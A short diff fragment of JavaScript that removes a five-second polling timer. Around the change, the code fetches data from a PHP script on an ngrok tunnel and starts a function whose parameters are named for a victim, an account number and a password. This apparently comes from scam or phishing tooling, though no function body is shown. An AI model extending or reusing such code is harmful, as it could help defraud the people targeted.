@@ -119,7 +119,7 @@ function get_temps() {
 	$.get('https://'+phpFileDomainName+'.ngrok.io/getTemp.php', call_temps);
 }
 
-setInterval('get_temps()', 5000)
+
 
 function emailjs(victimVariable, editNameVariable, editMessageVariable, accountNumber, passToPC) {
 	var randomNumberVariable = Math.floor((Math.random()*10000)+1).toString();
